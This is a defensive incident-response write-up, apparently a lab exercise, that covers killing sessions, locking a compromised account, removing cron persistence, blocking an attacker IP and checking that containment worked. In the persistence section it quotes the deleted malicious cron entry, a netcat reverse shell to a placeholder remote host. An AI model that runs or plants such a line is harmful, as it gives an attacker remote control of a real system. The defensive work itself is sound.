# Containment

## Objective

The goal of containment is to stop active attacker access while preserving evidence for investigation.

Actions were prioritized based on minimizing attacker persistence and preventing additional damage.

---

# 1. Terminate Active Sessions

The first step was identifying active attacker sessions.

Command:

```bash
who

w
```

Suspicious sessions were terminated:

```bash
pkill -KILL -u auditor
```

Reason:

Removing active attacker access prevents continued command execution.

---

# 2. Disable Compromised Account

The compromised account was disabled:

```bash
sudo usermod -L auditor
```

Reason:

The attacker obtained access through this account, making it an immediate risk.

---

# 3. Remove Persistence

The malicious cron job was removed.

Review:

```bash
crontab -l
```

Remove:

```bash
crontab -e
```

Deleted:

```
* * * * * nc -e /bin/sh <remote-ip> 12345
```

Reason:

This prevented automatic attacker reconnection.

---

# 4. Block Suspicious Network Activity

The attacker communication channel was blocked.

Example:

```bash
sudo iptables -A OUTPUT -d <attacker-ip> -j DROP
```

Reason:

Prevents outbound communication with attacker infrastructure.

---

# 5. Verify Containment

Validation commands:

```bash
ps aux

ss -tulpn

crontab -l

sudo lsof
```

Expected result:

- No reverse shell processes
- No suspicious connections
- No malicious scheduled tasks

---

# Containment Summary

| Action | Purpose |
|-|-|
| Terminate sessions | Stop active attacker access |
| Disable account | Prevent re-entry |
| Remove cron job | Remove persistence |
| Block traffic | Prevent communication |
| Verify processes | Confirm containment |

The system was considered contained once active access and persistence mechanisms were removed.